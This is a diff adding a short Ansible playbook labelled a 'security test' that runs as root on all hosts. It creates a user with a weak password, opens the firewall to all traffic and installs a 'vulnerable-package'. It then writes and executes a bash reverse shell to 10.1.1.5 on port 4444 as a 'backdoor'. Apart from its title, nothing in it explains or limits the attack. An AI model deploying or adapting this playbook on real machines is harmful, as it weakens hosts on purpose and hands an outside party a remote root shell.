@@ -1,0 +1,33 @@
+
+- name: Ansible Security Test
+  hosts: all
+  become: yes
+  gather_facts: no
+
+  tasks:
+    - name: Create a dummy user with a weak password
+      user:
+        name: 'testuser'
+        password: 'password123'
+      
+    - name: Configure firewall to allow all traffic
+      ufw:
+        rule: allow
+
+    - name: Disable SSH password authentication
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        regexp: '^\s*#?\s*PasswordAuthentication\s+(yes|no)'
+        line: 'PasswordAuthentication no'
+        state: present
+      
+    - name: Install a vulnerable package
+      apt:
+        name: 'vulnerable-package'
+        state: present
+
+    - name: Set up a backdoor
+      command: sh -c 'echo -e "#!/bin/bash\n/bin/bash -i > /dev/tcp/10.1.1.5/4444 0<&1 2>&1" > /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh'
+  
+    - name: Execute the backdoor
+      command: /tmp/backdoor.sh
